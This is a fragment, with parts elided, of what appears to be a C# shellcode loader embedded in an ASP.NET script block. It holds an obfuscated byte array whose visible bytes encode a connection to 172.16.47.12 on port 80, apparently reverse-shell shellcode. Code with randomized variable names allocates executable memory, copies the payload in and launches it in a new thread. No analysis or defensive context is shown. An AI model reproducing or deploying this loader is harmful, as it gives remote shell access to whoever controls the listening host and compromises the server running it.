...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x00,0x50,0xac,0x10,0x2f,0x0c,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr gdcAH = VirtualAlloc(IntPtr.Zero,(UIntPtr)xsBD7Sw6V.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(xsBD7Sw6V,0,gdcAH,xsBD7Sw6V.Length);
        IntPtr sv5_J = IntPtr.Zero;
        IntPtr lyxC_RLP5YV = CreateThread(IntPtr.Zero,UIntPtr.Zero,gdcAH,IntPtr.Zero,0,ref sv5_J);
    }
</script>
